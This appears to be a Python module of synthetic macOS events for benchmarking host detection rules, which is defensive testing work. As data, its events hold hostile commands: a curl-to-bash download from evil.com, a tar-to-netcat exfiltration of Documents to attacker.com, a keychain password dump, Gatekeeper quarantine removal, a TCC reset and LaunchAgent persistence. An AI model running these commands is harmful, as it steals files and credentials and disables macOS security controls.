"""macOS Host Detection Benchmark Scenarios

This module provides test scenarios for validating macOS detection rules.
Each scenario generates synthetic events that should trigger specific detections.
"""

import hashlib
import json
import uuid
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional, Callable
from dataclasses import dataclass, field


@dataclass
class TestScenario:
    """Definition of a test scenario for macOS detection."""
    name: str
    description: str
    expected_detection: str  # Rule ID that should trigger
    events: List[Dict[str, Any]] = field(default_factory=list)
    validation_fn: Optional[Callable] = None


def generate_event_id() -> str:
    """Generate a unique event ID."""
    return hashlib.sha256(uuid.uuid4().bytes).hexdigest()[:32]


def create_macos_event(
    event_type: str,
    timestamp: Optional[datetime] = None,
    user: str = "testuser",
    process: str = "test",
    parent_process: Optional[str] = None,
    message: str = "",
    outcome: str = "unknown",
    risk_tags: Optional[List[str]] = None,
    **kwargs
) -> Dict[str, Any]:
    """Create a synthetic macOS event with proper structure."""
    if timestamp is None:
        timestamp = datetime.utcnow()
    
    event = {
        "event_id": generate_event_id(),
        "timestamp": timestamp.isoformat() + "Z",
        "platform": "macos",
        "source": "test_scenario",
        "source_subsystem": kwargs.get("subsystem", "com.apple.test"),
        "source_process": process,
        "event_type": event_type,
        "outcome": outcome,
        "actor": {
            "user": user,
            "process": process,
            "parent_process": parent_process,
            "executable_path": kwargs.get("executable_path", f"/usr/bin/{process}"),
        },
        "target": {
            "user": kwargs.get("target_user"),
            "resource": kwargs.get("target_resource"),
            "resource_type": kwargs.get("target_resource_type"),
        },
        "risk_tags": risk_tags or [],
        "metadata": {
            "macos_message": message,
            "test_scenario": True,
        }
    }
    
    # Clean up None values in target
    event["target"] = {k: v for k, v in event["target"].items() if v is not None}
    
    return event


# ═══════════════════════════════════════════════════════════════════════════════
# Test Scenario Definitions
# ═══════════════════════════════════════════════════════════════════════════════

def scenario_failed_auth_burst() -> TestScenario:
    """
    Scenario: Multiple failed SSH authentication attempts within short window.
    Expected: RULE-201 (macOS Authentication Failures) or RULE-212 (Repeated Sudo Failures)
    """
    base_time = datetime.utcnow() - timedelta(hours=1)
    events = []
    
    # Generate 5 failed auth attempts in 3 minutes
    for i in range(5):
        events.append(create_macos_event(
            event_type="auth_failure",
            timestamp=base_time + timedelta(seconds=i * 40),
            user="attacker",
            process="sshd",
            message=f"Authentication failed for user attacker from 192.168.1.100",
            outcome="failure",
            risk_tags=["auth", "network_service"],
            target_user="root",
        ))
    
    return TestScenario(
        name="failed_auth_burst",
        description="Multiple failed SSH authentication attempts indicating brute force",
        expected_detection="RULE-201",
        events=events,
    )


def scenario_sudo_escalation() -> TestScenario:
    """
    Scenario: Suspicious sudo usage pattern.
    Expected: RULE-202 (macOS Sudo Misuse)
    """
    base_time = datetime.utcnow() - timedelta(hours=1)
    events = []
    
    # Sudo attempt with suspicious command
    events.append(create_macos_event(
        event_type="privilege_escalation",
        timestamp=base_time,
        user="bob",
        process="sudo",
        message="sudo: bob : user NOT in sudoers ; TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash",
        outcome="failure",
        risk_tags=["privilege_escalation", "admin_context"],
        target_user="root",
    ))
    
    # Followed by sudo -l enumeration
    events.append(create_macos_event(
        event_type="privilege_escalation",
        timestamp=base_time + timedelta(minutes=2),
        user="bob",
        process="sudo",
        message="sudo: bob : 3 incorrect password attempts ; logfile entry",
        outcome="failure",
        risk_tags=["privilege_escalation"],
    ))
    
    return TestScenario(
        name="sudo_escalation",
        description="Unauthorized sudo attempt followed by enumeration",
        expected_detection="RULE-202",
        events=events,
    )


def scenario_persistence_launchagent() -> TestScenario:
    """
    Scenario: Creation of a LaunchAgent for persistence.
    Expected: RULE-203 (macOS Persistence Creation)
    """
    base_time = datetime.utcnow() - timedelta(hours=1)
    events = []
    
    # File creation in LaunchAgents
    events.append(create_macos_event(
        event_type="persistence_created",
        timestamp=base_time,
        user="alice",
        process="bash",
        parent_process="Terminal",
        message="Created /Users/alice/Library/LaunchAgents/com.evil.update.plist",
        risk_tags=["persistence"],
        target_resource="/Users/alice/Library/LaunchAgents/com.evil.update.plist",
        target_resource_type="file",
        persistence_category="launchagent",
    ))
    
    # Launchctl load command
    events.append(create_macos_event(
        event_type="persistence_created",
        timestamp=base_time + timedelta(minutes=1),
        user="alice",
        process="launchctl",
        parent_process="bash",
        message="launchctl load /Users/alice/Library/LaunchAgents/com.evil.update.plist",
        risk_tags=["persistence"],
        persistence_category="launchagent",
    ))
    
    return TestScenario(
        name="persistence_launchagent",
        description="Creation of LaunchAgent plist and load for persistence",
        expected_detection="RULE-203",
        events=events,
    )


def scenario_suspicious_script_chain() -> TestScenario:
    """
    Scenario: Suspicious curl | bash execution chain.
    Expected: RULE-204 (macOS Unusual Script Execution)
    """
    base_time = datetime.utcnow() - timedelta(hours=1)
    events = []
    
    # Curl piped to bash
    events.append(create_macos_event(
        event_type="script_execution",
        timestamp=base_time,
        user="mallory",
        process="bash",
        parent_process="Safari",
        message="curl -s https://evil.com/install.sh | bash",
        risk_tags=["script_execution", "pipe_to_shell", "network_tool", "suspicious_chain"],
        execution_category="shell_inline",
    ))
    
    return TestScenario(
        name="suspicious_script_chain",
        description="Execution of remote script via curl pipe to shell",
        expected_detection="RULE-204",
        events=events,
    )


def scenario_unsigned_binary() -> TestScenario:
    """
    Scenario: Execution of unsigned binary from Downloads folder.
    Expected: RULE-213 (macOS Unsigned Execution)
    """
    base_time = datetime.utcnow() - timedelta(hours=1)
    events = []
    
    # Execution of unsigned binary
    events.append(create_macos_event(
        event_type="process_execution",
        timestamp=base_time,
        user="victim",
        process="Installer",
        parent_process="Finder",
        message="Executing unsigned binary: code signature invalid",
        executable_path="/Users/victim/Downloads/Installer.app/Contents/MacOS/Installer",
        risk_tags=["unsigned_binary", "unusual_path"],
        execution_category="downloads_directory",
    ))
    
    return TestScenario(
        name="unsigned_binary",
        description="Execution of unsigned binary from Downloads folder",
        expected_detection="RULE-213",
        events=events,
    )


def scenario_gatekeeper_bypass() -> TestScenario:
    """
    Scenario: Attempt to bypass Gatekeeper by removing quarantine.
    Expected: RULE-207 (TCC Violations) or RULE-206 (Suspicious System Activity)
    """
    base_time = datetime.utcnow() - timedelta(hours=1)
    events = []
    
    # xattr removal of quarantine
    events.append(create_macos_event(
        event_type="security_control_disabled",
        timestamp=base_time,
        user="attacker",
        process="xattr",
        parent_process="Terminal",
        message="xattr -d com.apple.quarantine /Users/attacker/Downloads/payload.app",
        risk_tags=["security_evasion", "quarantine"],
    ))
    
    # Followed by execution
    events.append(create_macos_event(
        event_type="process_execution",
        timestamp=base_time + timedelta(seconds=30),
        user="attacker",
        process="payload",
        parent_process="Finder",
        message="Launched quarantined application after xattr removal",
        executable_path="/Users/attacker/Downloads/payload.app/Contents/MacOS/payload",
        risk_tags=["quarantine", "security_evasion"],
    ))
    
    return TestScenario(
        name="gatekeeper_bypass",
        description="Removal of quarantine attribute to bypass Gatekeeper",
        expected_detection="RULE-207",
        events=events,
    )


def scenario_malware_detected() -> TestScenario:
    """
    Scenario: XProtect/MRT detects and blocks malware.
    Expected: RULE-208 (macOS Gatekeeper Alerts)
    """
    base_time = datetime.utcnow() - timedelta(hours=1)
    events = []
    
    # XProtect detection
    events.append(create_macos_event(
        event_type="malware_blocked",
        timestamp=base_time,
        user="system",
        process="XProtect",
        message="XProtect detected malware: Trojan.OSX.EvilGen variant in /Users/user/Downloads/bad.dmg",
        outcome="blocked",
        risk_tags=["malware"],
        target_resource="/Users/user/Downloads/bad.dmg",
        target_resource_type="file",
    ))
    
    return TestScenario(
        name="malware_detected",
        description="XProtect detection and blocking of malware",
        expected_detection="RULE-208",
        events=events,
    )


def scenario_process_anomaly() -> TestScenario:
    """
    Scenario: Suspicious parent-child process relationship.
    Expected: RULE-209 (macOS Process Anomalies)
    """
    base_time = datetime.utcnow() - timedelta(hours=1)
    events = []
    
    # Safari spawning bash (suspicious)
    events.append(create_macos_event(
        event_type="process_execution",
        timestamp=base_time,
        user="victim",
        process="bash",
        parent_process="Safari",
        message="Process spawned: bash from Safari",
        executable_path="/bin/bash",
        risk_tags=["suspicious_parent", "shell_execution"],
    ))
    
    return TestScenario(
        name="process_anomaly",
        description="Suspicious parent-child process: Safari spawning bash",
        expected_detection="RULE-209",
        events=events,
    )


def scenario_keychain_access() -> TestScenario:
    """
    Scenario: Unauthorized keychain access attempt.
    Expected: RULE-210 (macOS Credential Access)
    """
    base_time = datetime.utcnow() - timedelta(hours=1)
    events = []
    
    # Keychain access
    events.append(create_macos_event(
        event_type="keychain_access",
        timestamp=base_time,
        user="attacker",
        process="security",
        parent_process="bash",
        message="security find-generic-password -s 'Chrome' -w",
        risk_tags=["credentials", "keychain"],
        target_resource="Chrome passwords",
        target_resource_type="credential",
    ))
    
    return TestScenario(
        name="keychain_access",
        description="Attempt to extract passwords from system keychain",
        expected_detection="RULE-210",
        events=events,
    )


def scenario_network_exfil() -> TestScenario:
    """
    Scenario: Suspicious network activity indicating exfiltration.
    Expected: RULE-211 (macOS Network Anomalies)
    """
    base_time = datetime.utcnow() - timedelta(hours=1)
    events = []
    
    # Data staging and exfil
    events.append(create_macos_event(
        event_type="network_connection",
        timestamp=base_time,
        user="attacker",
        process="bash",
        parent_process="Terminal",
        message="tar czf - /Users/*/Documents | nc attacker.com 4444",
        risk_tags=["network_tool", "pipe_to_shell", "exfiltration"],
    ))
    
    return TestScenario(
        name="network_exfil",
        description="Data exfiltration via tar piped to netcat",
        expected_detection="RULE-211",
        events=events,
    )


def scenario_repeated_sudo_failures() -> TestScenario:
    """
    Scenario: Brute force sudo attempts.
    Expected: RULE-212 (macOS Repeated Sudo Failures)
    """
    base_time = datetime.utcnow() - timedelta(hours=1)
    events = []
    
    # Generate 5 sudo failures in 4 minutes
    for i in range(5):
        events.append(create_macos_event(
            event_type="auth_failure",
            timestamp=base_time + timedelta(seconds=i * 50),
            user="attacker",
            process="sudo",
            message=f"sudo: 3 incorrect password attempts for attacker",
            outcome="failure",
            risk_tags=["auth", "privilege_escalation"],
            target_user="root",
        ))
    
    return TestScenario(
        name="repeated_sudo_failures",
        description="Multiple failed sudo password attempts",
        expected_detection="RULE-212",
        events=events,
    )


def scenario_tcc_reset() -> TestScenario:
    """
    Scenario: TCC database reset to remove privacy restrictions.
    Expected: RULE-207 (TCC Violations)
    """
    base_time = datetime.utcnow() - timedelta(hours=1)
    events = []
    
    # TCC reset
    events.append(create_macos_event(
        event_type="tcc_modified",
        timestamp=base_time,
        user="admin",
        process="tccutil",
        parent_process="Terminal",
        message="tccutil reset All com.malicious.app",
        risk_tags=["privacy", "security_evasion"],
        target_resource="TCC permissions for com.malicious.app",
        target_resource_type="privacy_service",
    ))
    
    return TestScenario(
        name="tcc_reset",
        description="Reset of TCC privacy permissions to bypass restrictions",
        expected_detection="RULE-207",
        events=events,
    )


def scenario_temp_execution() -> TestScenario:
    """
    Scenario: Execution of binary from /tmp directory.
    Expected: RULE-213 (Unsigned Execution) or RULE-204 (Script Execution)
    """
    base_time = datetime.utcnow() - timedelta(hours=1)
    events = []
    
    # Download and execute from tmp
    events.append(create_macos_event(
        event_type="process_execution",
        timestamp=base_time,
        user="victim",
        process="evil_payload",
        parent_process="curl",
        message="Executing downloaded payload from /tmp",
        executable_path="/tmp/evil_payload",
        risk_tags=["temp_execution", "unusual_path", "network_tool"],
        execution_category="temp_directory",
    ))
    
    return TestScenario(
        name="temp_execution",
        description="Execution of binary downloaded to /tmp",
        expected_detection="RULE-213",
        events=events,
    )


# ═══════════════════════════════════════════════════════════════════════════════
# Test Runner
# ═══════════════════════════════════════════════════════════════════════════════

def get_all_scenarios() -> List[TestScenario]:
    """Get all available test scenarios."""
    return [
        scenario_failed_auth_burst(),
        scenario_sudo_escalation(),
        scenario_persistence_launchagent(),
        scenario_suspicious_script_chain(),
        scenario_unsigned_binary(),
        scenario_gatekeeper_bypass(),
        scenario_malware_detected(),
        scenario_process_anomaly(),
        scenario_keychain_access(),
        scenario_network_exfil(),
        scenario_repeated_sudo_failures(),
        scenario_tcc_reset(),
        scenario_temp_execution(),
    ]


def run_detection_test(scenario: TestScenario, detect_fn: Callable) -> Dict[str, Any]:
    """
    Run a detection test against a scenario.
    
    Args:
        scenario: TestScenario with events to test
        detect_fn: Detection function that takes events and returns detected IDs
    
    Returns:
        Test result with pass/fail status and details
    """
    detected_ids = detect_fn(scenario.events)
    
    # Check if any events from scenario were detected
    scenario_event_ids = {e["event_id"] for e in scenario.events}
    detected_scenario_events = scenario_event_ids.intersection(set(detected_ids))
    
    passed = len(detected_scenario_events) > 0
    
    return {
        "scenario_name": scenario.name,
        "description": scenario.description,
        "expected_detection": scenario.expected_detection,
        "passed": passed,
        "events_generated": len(scenario.events),
        "events_detected": len(detected_scenario_events),
        "detected_event_ids": list(detected_scenario_events),
        "all_detected_ids": detected_ids,
    }


def run_all_tests(detect_module) -> Dict[str, Any]:
    """
    Run all test scenarios against the detection module.
    
    Args:
        detect_module: Module containing detection rule functions
    
    Returns:
        Complete test results with statistics
    """
    import hashlib
    
    scenarios = get_all_scenarios()
    results = []
    
    rule_mapping = {
        "RULE-201": detect_module.detect_macos_authentication_failures,
        "RULE-202": detect_module.detect_macos_sudo_misuse,
        "RULE-203": detect_module.detect_macos_persistence_creation,
        "RULE-204": detect_module.detect_macos_unusual_script_execution,
        "RULE-205": detect_module.detect_macos_suspicious_binary_execution,
        "RULE-206": detect_module.detect_macos_suspicious_system_activity,
        "RULE-207": detect_module.detect_macos_tcc_violations,
        "RULE-208": detect_module.detect_macos_gatekeeper_alerts,
        "RULE-209": detect_module.detect_macos_process_anomalies,
        "RULE-210": detect_module.detect_macos_credential_access,
        "RULE-211": detect_module.detect_macos_network_anomalies,
        "RULE-212": detect_module.detect_macos_repeated_sudo_failures,
        "RULE-213": detect_module.detect_macos_unsigned_execution,
    }
    
    for scenario in scenarios:
        detect_fn = rule_mapping.get(scenario.expected_detection)
        if detect_fn:
            result = run_detection_test(scenario, detect_fn)
            results.append(result)
        else:
            results.append({
                "scenario_name": scenario.name,
                "error": f"Detection function for {scenario.expected_detection} not found",
                "passed": False,
            })
    
    passed_count = sum(1 for r in results if r.get("passed"))
    failed_count = len(results) - passed_count
    
    return {
        "total_scenarios": len(scenarios),
        "passed": passed_count,
        "failed": failed_count,
        "pass_rate": passed_count / len(scenarios) if scenarios else 0,
        "results": results,
    }


def print_test_results(results: Dict[str, Any]) -> None:
    """Pretty print test results."""
    print("=" * 80)
    print("MACOS HOST DETECTION BENCHMARK RESULTS")
    print("=" * 80)
    print(f"\nTotal Scenarios: {results['total_scenarios']}")
    print(f"Passed: {results['passed']} ✅")
    print(f"Failed: {results['failed']} ❌")
    print(f"Pass Rate: {results['pass_rate']:.1%}")
    print("\n" + "-" * 80)
    
    for result in results["results"]:
        status = "✅ PASS" if result.get("passed") else "❌ FAIL"
        print(f"\n{status}: {result['scenario_name']}")
        print(f"  Description: {result.get('description', 'N/A')}")
        print(f"  Expected Rule: {result.get('expected_detection', 'N/A')}")
        
        if "error" in result:
            print(f"  Error: {result['error']}")
        else:
            print(f"  Events Generated: {result.get('events_generated', 0)}")
            print(f"  Events Detected: {result.get('events_detected', 0)}")
    
    print("\n" + "=" * 80)


# ═══════════════════════════════════════════════════════════════════════════════
# Export Functions
# ═══════════════════════════════════════════════════════════════════════════════

def export_scenario_events(scenario: TestScenario, output_path: str) -> None:
    """Export scenario events to JSON file for external testing."""
    with open(output_path, "w") as f:
        json.dump({
            "scenario": scenario.name,
            "description": scenario.description,
            "expected_rule": scenario.expected_detection,
            "events": scenario.events,
        }, f, indent=2)


def export_all_scenarios(output_dir: str) -> None:
    """Export all scenarios to individual JSON files."""
    import os
    os.makedirs(output_dir, exist_ok=True)
    
    for scenario in get_all_scenarios():
        filename = f"{scenario.name}.json"
        filepath = os.path.join(output_dir, filename)
        export_scenario_events(scenario, filepath)
        print(f"Exported: {filepath}")


if __name__ == "__main__":
    # Run tests when executed directly
    import sys
    sys.path.insert(0, "/root/.openclaw/workspace/secopsai")
    
    import detect
    results = run_all_tests(detect)
    print_test_results(results)
    
    # Export scenarios for external use
    export_all_scenarios("/root/.openclaw/workspace/secopsai/data/test_scenarios")
